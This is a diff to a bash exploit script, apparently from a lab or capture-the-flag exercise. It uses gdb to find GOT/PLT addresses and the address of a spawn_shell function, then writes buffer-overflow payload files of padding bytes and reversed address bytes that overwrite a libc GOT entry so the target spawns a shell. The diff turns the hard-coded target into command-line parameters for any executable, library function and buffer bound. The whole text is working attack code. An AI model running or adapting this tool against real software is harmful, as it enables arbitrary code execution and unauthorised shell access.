@@ -2,10 +2,19 @@
 
 # Construct payloads
 
-binname="./brittle"
+usage="Usage: $0 <executable> <library-fn-name> <item-buffer-bound>"
+
+# Check number of parameters
+if [[ "$#" -ne 3 ]]; then
+        echo $usage
+        exit 1
+fi
+
+binname=$1
+libfn=$2
+bufbound=$3
 dat1="data1.dat"
 dat2="data2.dat"
-libfn="exit"
 execfn="execl"
 
 # Find address of libc library function to be overwritten
@@ -27,16 +36,16 @@ echo "Location of $execfn@got.plt: 0x$execloc"
 # Find address of spawn_shell
 echo -n "p spawn_shell" > comms2
 spawnaddrline=(`gdb $binname < comms2 | grep "0x[0-9a-fA-F]\{6,8\}"`)
-echo "Address of spawn_shell(): ${spawnaddrline[8]}"
+spawnaddr=(`echo ${spawnaddrline[8]} | tr 'x' '0'`)
+echo "Address of spawn_shell(): $spawnaddr"
 
 # Write first payload file
 if [ -f $dat1 ]; then rm $dat1; fi
-for i in {0..47}; do echo -n -e \\x41 >> $dat1; done
+for i in $(seq 0 "$bufbound"); do echo -n -e \\x41 >> $dat1; done
 for ((i=7;i>=0;i--)); do echo -n -e \\x${libaddrline:2*i:2} >> $dat1; done
 
 # Write second payload file
 if [ -f $dat2 ]; then rm $dat2; fi
-spawnaddr=(`echo ${spawnaddrline[8]} | tr 'x' '0'`)
 for ((i=3;i>=0;i--)); do echo -n -e \\x${spawnaddr:2*i:2} >> $dat2; done
 for i in {0..3}; do echo -n -e \\x00 >> $dat2; done
 for i in $(seq 1 "$distance"); do
